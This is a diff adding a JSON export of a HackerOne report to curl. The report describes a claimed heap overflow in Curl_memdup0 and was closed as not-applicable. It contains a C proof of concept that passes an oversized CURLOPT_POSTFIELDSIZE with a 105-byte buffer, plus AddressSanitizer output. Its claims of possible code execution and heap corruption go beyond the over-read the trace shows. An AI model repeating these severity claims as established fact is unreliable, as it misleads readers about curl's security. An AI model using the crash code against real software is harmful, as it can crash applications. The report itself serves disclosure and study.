@@ -1,0 +1,147 @@
+{
+  "id": 3292590,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjkyNTkw",
+  "url": "https://hackerone.com/reports/3292590",
+  "title": "Heap Buffer Overflow in Curl_memdup0() via CURLOPT_COPYPOSTFIELDS/CURLOPT_POSTFIELDSIZE Mismatch",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "high",
+  "readable_substate": "N/A",
+  "created_at": "2025-08-09T02:32:38.704Z",
+  "submitted_at": "2025-08-09T02:32:38.906Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "geeknik",
+    "url": "/geeknik",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/jgjvp6dlesp661w5ashvoami0j3c/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-08-09T13:00:47.625Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-08-09T11:26:23.621Z",
+  "team_member_agreed_on_going_public_at": "2025-08-09T13:00:47.417Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\nA heap buffer overflow vulnerability exists in libcurl's `Curl_memdup0()` function when handling `CURLOPT_COPYPOSTFIELDS` operations. The vulnerability occurs when libcurl internally processes POST data where the specified `CURLOPT_POSTFIELDSIZE` exceeds the actual buffer size of data set via `CURLOPT_COPYPOSTFIELDS`. This is a legitimate use case that libcurl should handle safely, but currently results in out-of-bounds memory access.\n\n## POC\n### Environment\n* libcurl version: 8.16.0-DEV (master branch)\n* Compiler: Clang 20.1.8 with Address Sanitizer\n* OS: MacOS 26 Dev Beta 5\n\n`gcc -fsanitize=address -g -o poc poc.c -lcurl`\n```\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <curl/curl.h>\n\n#define ACTUAL_SIZE 105\n#define CLAIMED_SIZE 976909154L\n\nint main(void) {\n    printf(\"[+] libcurl Heap Buffer Overflow PoC\\n\");\n    printf(\"[+] CURLOPT_COPYPOSTFIELDS vulnerability reproduction\\n\\n\");\n    \n    /* Initialize libcurl */\n    curl_global_init(CURL_GLOBAL_ALL);\n    CURL *curl = curl_easy_init();\n    \n    if(!curl) {\n        fprintf(stderr, \"[!] Failed to initialize curl\\n\");\n        return 1;\n    }\n    \n    printf(\"[+] libcurl initialized successfully\\n\");\n    \n    /* CRITICAL: Allocate buffer on HEAP, not stack */\n    char *heap_buffer = (char *)malloc(ACTUAL_SIZE);\n    if(!heap_buffer) {\n        fprintf(stderr, \"[!] Failed to allocate heap buffer\\n\");\n        curl_easy_cleanup(curl);\n        return 1;\n    }\n    \n    /* Fill with test data */\n    memset(heap_buffer, 'A', ACTUAL_SIZE - 1);\n    heap_buffer[ACTUAL_SIZE - 1] = '\\0';\n    \n    printf(\"[+] Allocated HEAP buffer: %d bytes at %p\\n\", ACTUAL_SIZE, (void*)heap_buffer);\n    printf(\"[+] Buffer content: \\\"%.50s...\\\"\\n\", heap_buffer);\n    \n    /* Set a basic URL (won't actually connect) */\n    curl_easy_setopt(curl, CURLOPT_URL, \"http://example.com\");\n    \n    /* Set POST mode */\n    curl_easy_setopt(curl, CURLOPT_POST, 1L);\n    \n    /* VULNERABILITY TRIGGER - Set size much larger than actual buffer */\n    printf(\"[+] Setting CURLOPT_POSTFIELDSIZE to: %ld bytes\\n\", CLAIMED_SIZE);\n    CURLcode res = curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, CLAIMED_SIZE);\n    if(res != CURLE_OK) {\n        fprintf(stderr, \"[!] Failed to set POSTFIELDSIZE: %s\\n\", curl_easy_strerror(res));\n        free(heap_buffer);\n        curl_easy_cleanup(curl);\n        return 1;\n    }\n    printf(\"[+] CURLOPT_POSTFIELDSIZE set successfully\\n\");\n    \n    /* TRIGGER THE HEAP BUFFER OVERFLOW */\n    printf(\"[+] Calling CURLOPT_COPYPOSTFIELDS with %d-byte heap buffer...\\n\", ACTUAL_SIZE);\n    printf(\"[!] This should trigger HEAP buffer overflow in Curl_memdup0()\\n\");\n    printf(\"[!] AddressSanitizer should detect out-of-bounds read on HEAP\\n\\n\");\n    \n    /* This will cause Curl_memdup0() to read CLAIMED_SIZE bytes from ACTUAL_SIZE buffer */\n    res = curl_easy_setopt(curl, CURLOPT_COPYPOSTFIELDS, heap_buffer);\n    \n    if(res == CURLE_OK) {\n        printf(\"[?] CURLOPT_COPYPOSTFIELDS succeeded (unexpected if ASAN enabled)\\n\");\n        printf(\"[?] The overflow may have occurred silently\\n\");\n    } else {\n        printf(\"[!] CURLOPT_COPYPOSTFIELDS failed: %s\\n\", curl_easy_strerror(res));\n    }\n    \n    /* Cleanup */\n    free(heap_buffer);\n    curl_easy_cleanup(curl);\n    curl_global_cleanup();\n    \n    printf(\"[+] If you see this, the overflow was not detected\\n\");\n    printf(\"[!] Run with AddressSanitizer: gcc -fsanitize=address poc.c -lcurl\\n\");\n    \n    return 0;\n}\n```\n\n## Vulnerable Code Path \n`CURLOPT_POSTFIELDSIZE` set to 976909154\n`CURLOPT_COPYPOSTFIELDS` given 105-byte buffer\n`Curl_memdup0()` blindly trusts the size parameter\nNo validation that size matches actual buffer\nDetection: Compile with AddressSanitizer (-fsanitize=address) to observe heap buffer overflow.\n\n```\n[+] libcurl Heap Buffer Overflow PoC\n[+] CURLOPT_COPYPOSTFIELDS vulnerability reproduction\n\n[+] libcurl initialized successfully\n[+] Allocated HEAP buffer: 105 bytes at 0x60b000002fb0\n[+] Buffer content: \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...\"\n[+] Setting CURLOPT_POSTFIELDSIZE to: 976909154 bytes\n[+] CURLOPT_POSTFIELDSIZE set successfully\n[+] Calling CURLOPT_COPYPOSTFIELDS with 105-byte heap buffer...\n[!] This should trigger HEAP buffer overflow in Curl_memdup0()\n[!] AddressSanitizer should detect out-of-bounds read on HEAP\n\n=================================================================\n==33081==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60b000003019 at pc 0x000101451c64 bp 0x00016f33df30 sp 0x00016f33d6d0\nREAD of size 976909154 at 0x60b000003019 thread T0\n    #0 0x000101451c60 in memcpy+0x284 (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x85c60)\n    #1 0x0001acb23954 in Curl_memdup0+0x44 (libcurl.4.dylib:arm64e+0x4e954)\n    #2 0x0001acb1a678 in Curl_vsetopt+0xc60 (libcurl.4.dylib:arm64e+0x45678)\n    #3 0x0001acb1d4c0 in curl_easy_setopt+0x20 (libcurl.4.dylib:arm64e+0x484c0)\n    #4 0x000100ac0b50 in main poc_heap_overflow_fixed.c:73\n    #5 0x000190b41920 in start+0x18fc (dyld:arm64e+0x3920)\n\n0x60b000003019 is located 0 bytes after 105-byte region [0x60b000002fb0,0x60b000003019)\nallocated by thread T0 here:\n    #0 0x00010140930c in malloc+0x78 (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x3d30c)\n    #1 0x000100ac0904 in main poc_heap_overflow_fixed.c:36\n    #2 0x000190b41920 in start+0x18fc (dyld:arm64e+0x3920)\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow (libcurl.4.dylib:arm64e+0x4e954) in Curl_memdup0+0x44\nShadow bytes around the buggy address:\n  0x60b000002d80: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\n  0x60b000002e00: fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd\n  0x60b000002e80: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa\n  0x60b000002f00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa\n  0x60b000002f80: fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00\n=>0x60b000003000: 00 00 00[01]fa fa fa fa fa fa fa fa fa fa fa fa\n  0x60b000003080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x60b000003100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x60b000003180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x60b000003200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x60b000003280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==33081==ABORTING\n```\n\n## Impact\n\n## Severity: High\n\n### Security Impact:\n> Information Disclosure: Out-of-bounds read exposes adjacent heap memory contents\n> Potential RCE: Heap layout manipulation may enable code execution in specific scenarios\n> Denial of Service: Memory access violations cause application crashes\n> Data Corruption: Heap metadata corruption affects application stability\n\n### Attack Scenarios:\n> Applications that accept user-controlled POST data sizes\n> Network services processing untrusted HTTP POST parameters\n> Any application where attackers can influence both POST data and size parameters\n\n### Real-World Relevance:\n> This affects legitimate use cases where applications might:\n> Truncate or pad POST data based on protocol requirements\n> Process variable-length content with fixed-size headers\n> Handle network protocols with length prefixes",
+  "weakness": {
+    "id": 9,
+    "name": "Buffer Over-read"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 19,
+  "voters": [
+    "thalaivar304",
+    "2026",
+    "geeknik",
+    "nagu123",
+    "mai91",
+    "xx_z",
+    "rivex_team",
+    "leocyberchief",
+    "0xs3iif",
+    "lexn4me158",
+    "and 9 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 739152,
+      "category": "researcher",
+      "content": "This report demonstrates a heap buffer overflow in `Curl_memdup0()` triggered when `CURLOPT_COPYPOSTFIELDS` is called after `CURLOPT_POSTFIELDSIZE` is set to a value larger than the actual buffer length.\n\nWhile this may be considered an API contract violation, the resulting behavior is not merely “undefined”, it is predictably exploitable memory corruption in a widely deployed network library. In practice, `POST` data length values can originate from untrusted sources such as:\n\t->\tLength fields in higher-layer protocols\n\t->\tUser-controlled input in proxying or gateway scenarios\n\t->\tData marshalled between disparate components where size and buffer are provided separately\n\nA malicious actor does not need to be the developer to exploit this; they only need influence over the size parameter in an integration that uses `CURLOPT_COPYPOSTFIELDS`.\n\nRobust, security-conscious libraries defend against common misuse, especially when the misuse is trivially detectable at runtime. Adding a bounds check in `Curl_memdup0()` (e.g., verifying the buffer length before memcpy) would prevent heap memory disclosure, application crashes, or potential code execution, and would not break correct API usage.\n\nIn security terms:\n\t->\tBug class: Heap Buffer Overflow\n\t->\tImpact: Information disclosure, DoS, potential RCE with heap shaping\n\t-> Root cause: No bounds validation in Curl_memdup0() when size parameter is larger than provided data\n\t-> Fix class: Defensive length validation before memcpy\n\n*A caller bug should not translate into an attacker-controlled heap overflow in a security-critical library.*",
+      "updated_at": "2025-08-09T11:32:11.139Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 12276,
+        "username": "geeknik",
+        "name": "Brian Carpenter",
+        "bio": "Arcane bug finding braggart trying to make the Internet a safer place for everyone.",
+        "cleared": false,
+        "verified": true,
+        "website": "https://github.com/geeknik",
+        "location": "USA",
+        "created_at": "2014-09-21T04:15:33.476Z",
+        "url": "https://hackerone.com/geeknik",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/jgjvp6dlesp661w5ashvoami0j3c/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/jgjvp6dlesp661w5ashvoami0j3c/74790fe75ac5dbe8a5140a122388d59ebac913dcfa941f0b3a45e6cad161f9ea",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/jgjvp6dlesp661w5ashvoami0j3c/fba683f28d17594d98b39d87e2b3aa09acb938c22d49b206f663ae961dc39adc"
+        }
+      }
+    }
+  ]
+}
